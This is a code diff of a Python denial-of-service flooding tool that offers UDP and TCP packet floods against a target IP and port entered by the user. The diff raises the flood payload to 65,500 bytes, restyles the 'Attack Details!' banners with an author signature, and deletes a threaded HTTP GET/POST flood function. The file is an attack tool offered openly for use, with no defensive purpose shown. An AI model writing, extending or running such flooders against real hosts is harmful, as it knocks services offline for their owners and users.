@@ -43,19 +43,24 @@ def normalize_url(target):
 
  
 def run_udp_attack(target_ip, target_port, attack_speed):
-    message = b"A" * 65507
+    message = b"A" * 65500
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     print(logo)
-    print(f"""{BLUE}
-╔══════════════════════════════════════════════════════╗
-║                Attack Details!                       ║
-╠══════════════════════════════════════════════════════╣
-║ Target  : {target_ip}:{target_port}
-║ Method : UDP
-║ Control : Press Ctrl+C to stop
-╚══════════════════════════════════════════════════════╝
-{RESET}""")
+    print("")
+    print("")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{BLUE}╠{RESET} {BLUE}Attack Details!{RESET}")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{BLUE}╠{RESET} Target: {GREEN}{target_ip}{RESET} ")
+    print(f"{BLUE}╠{RESET} Port: {GREEN}{target_port}{RESET} ")
+    print(f"{BLUE}╠{RESET} Speed: {GREEN}{attack_speed}{RESET} ")
+    print(f"{BLUE}╠{RESET} Bytes: {GREEN}65500{RESET} {GREEN2}[MAX]{RESET} ")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{BLUE}╠{RESET} Ctrl + C Stops the attack! (Starting in 4 seconds)")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{BLUE}╠ {GREEN}I{RESET} {RED}Love{RESET} {GREEN2}You!{RESET} {BLUE}--from kube0n{RESET} {RED}<3{RESET}")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
     time.sleep(4)
     os.system("clear")
     packet_count = 0
@@ -87,17 +92,22 @@ def run_udp_attack(target_ip, target_port, attack_speed):
 
 def run_tcp_attack(target_ip, target_port, attack_speed):
 
-    message = b"A" * 1460
+    message = b"A" * 65500
     print(logo)
-    print(f"""{BLUE}
-╔══════════════════════════════════════════════════════╗
-║                Attack Details!                       ║
-╠══════════════════════════════════════════════════════╣
-║ Target  : {target_ip}:{target_port}
-║ Method : TCP
-║ Control : Press Ctrl+C to stop
-╚══════════════════════════════════════════════════════╝
-{RESET}""")
+    print("")
+    print("")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{BLUE}╠{RESET} {BLUE}Attack Details!{RESET}")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{BLUE}╠{RESET} Target: {GREEN}{target_ip}{RESET} ")
+    print(f"{BLUE}╠{RESET} Port: {GREEN}{target_port}{RESET} ")
+    print(f"{BLUE}╠{RESET} Speed: {GREEN}{attack_speed}{RESET} ")
+    print(f"{BLUE}╠{RESET} Bytes: {GREEN}65000{RESET} {GREEN2}[MAX]{RESET} ")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{BLUE}╠{RESET} Ctrl + C Stops the attack! (Starting in 4 seconds)")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
+    print(f"{BLUE}╠ {GREEN}I{RESET} {RED}Love{RESET} {GREEN2}You!{RESET} {BLUE}--from kube0n{RESET} {RED}<3{RESET}")
+    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
     time.sleep(4)
     os.system("clear")
     packetcount = 0
@@ -128,56 +138,6 @@ def run_tcp_attack(target_ip, target_port, attack_speed):
         time.sleep(5)
 
 
-def run_http_attack(method, target_url, attack_speed, thread_count):
-    manager = urllib3.PoolManager()
-    print(logo)
-
-    print(f"""{BLUE}
-╔══════════════════════════════════════════════════════╗
-║                Attack Details!                       ║
-╠══════════════════════════════════════════════════════╣
-║ Target  : {target_url}
-║ Method : HTTP {method}
-║ Control : Press Ctrl+C to stop
-╚══════════════════════════════════════════════════════╝
-{RESET}""")
-    time.sleep(4)
-    os.system("clear")
-    packetcounts = 0
-    def attack():
-        while True:
-            try:
-                rt = random.randint(10,100)
-                response = manager.request(method, target_url, timeout=0.01)
-                packetcounts += 1
-                print(f"{BLUE}[Atom Output]:{RESET} {method} Request #{packetcounts} Sent to {target_url},")
-                print(f"Bytes: {GREEN}1500{RESET} {GREEN2}[MAX]{RESET},")
-                print(f"RTT: {GREEN}{rt}{RESET},")
-            except Exception as exc:
-                os.system("clear")
-                print(logo)
-                print(f"{BLUE}[Atom Output]:{RESET} {method} request {RED}failed:{RESET} {exc}")
-            time.sleep(5)
-
-    threads = []
-    for _ in range(int(thread_count)):
-        thread = threading.Thread(target=attack, daemon=True)
-        thread.start()
-        threads.append(thread)
-
-    try:
-        while True:
-            time.sleep(0.5)
-    except KeyboardInterrupt:
-        os.system("clear")
-        print(logo)
-        print("\n Ctrl + c Pressed! stopping attack.")
-        print("Attack has stopped successfully!")
-        print("Exiting..")
-        time.sleep(5)
-        sys.exit(1)
-
-
 def main():
     os.system("clear")
     print(logo)
@@ -198,7 +158,7 @@ def main():
     print(f"{BLUE}│└─[01] UDP                                    │{RESET}")
     print(f"{BLUE}│└─[02] TCP                                    │{RESET}")
     print(f"{BLUE}│└─ Layer 7                                    │{RESET}")
-    print(f"{BLUE}│└─[03] HTTP - GET,POST                        │{RESET}")
+    print(f"{BLUE}│└─[03] SOON (DELETED HTTP,GET,POST)           │{RESET}")
     print(f"{BLUE}└──────────────────────────────────────────────┘{RESET}")
 
     print("Choose Method:")
@@ -223,24 +183,11 @@ def main():
         else:
             run_tcp_attack(ip, port, speed)
             
-    elif method == "HTTP":
-        print(logo)
-        print("Enter HTTP Method:")
-        http_method = input(f"{BLUE}└───> {RESET}").strip().upper()
-        os.system("clear")
-        print(logo)
-        print("Enter Target URL/IP:")
-        url = input(f"{BLUE}└───> {RESET}").strip()
-        os.system("clear")
-        print(logo)
-        print("Enter Thread Count:")
-        threads = input(f"{BLUE}└───> {RESET}").strip()
-        os.system("clear")
-        normalized = normalize_url(url)
-        run_http_attack(http_method, normalized, speed, threads)
     else:
+        os.system("clear")
         print(logo)
         print("Unknown selection. Exiting.")
+        sys.exit(1)
 
 
 if __name__ == "__main__":
